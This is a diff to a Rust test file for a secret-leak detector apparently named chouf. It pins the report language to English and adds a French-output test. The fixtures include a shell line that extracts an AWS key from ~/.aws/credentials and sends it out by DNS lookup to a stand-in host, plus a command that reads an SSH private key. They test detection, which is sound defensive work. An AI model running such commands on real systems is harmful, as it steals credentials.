@@ -16,6 +16,7 @@ fn chouf_env(args: &[&str], env: &[(&str, &str)]) -> (i32, String, serde_json::V
     let out = Command::new(env!("CARGO_BIN_EXE_chouf"))
         .args(args)
         .env("CHOUF_DATA", &data)
+        .env("CHOUF_LANG", "en") // the assertions read the English report; the machine may be set to French
         .envs(env.iter().copied())
         .output()
         .unwrap();
@@ -220,8 +221,18 @@ fn a_secret_leaving_the_machine_is_proven() {
     let script = "m=$(grep -o 'AKIA[0-9A-F]*' ~/.aws/credentials | cut -c5- | tr A-F a-f); getent hosts \"$m.exfil.example\" >/dev/null; exit 0";
     let (code, text, j) = chouf(&["run", "--", "bash", "-c", script]);
     assert_eq!(code, 1, "{text}");
-    assert!(text.contains("PROOF: your AWS access keys left the machine"), "{text}");
+    assert!(text.contains("PROOF: a secret left the machine") && text.contains("your AWS access keys"), "{text}");
     let l = &j["activity"]["leaks"][0];
     assert_eq!(l["port"], 53, "{text}");
     assert!(l["by"].as_str().unwrap().starts_with("getent hosts"), "{text}");
 }
+
+#[test]
+#[ignore]
+fn the_report_speaks_french_when_asked() {
+    let (_, text, j) = chouf_env(&["run", "--no-net", "--", "sh", "-c", "cat ~/.ssh/id_ed25519 >/dev/null"], &[("CHOUF_LANG", "fr")]);
+    assert!(text.contains("En bref") && text.contains("Les secrets qu'il a fouillés") && text.contains("(clé privée SSH)"), "{text}");
+    assert!(text.contains("remplace tes clés SSH et GPG"), "{text}");
+    assert_eq!(j["findings"][0]["why"], "SSH private key", "report.json stays in English");
+}
+
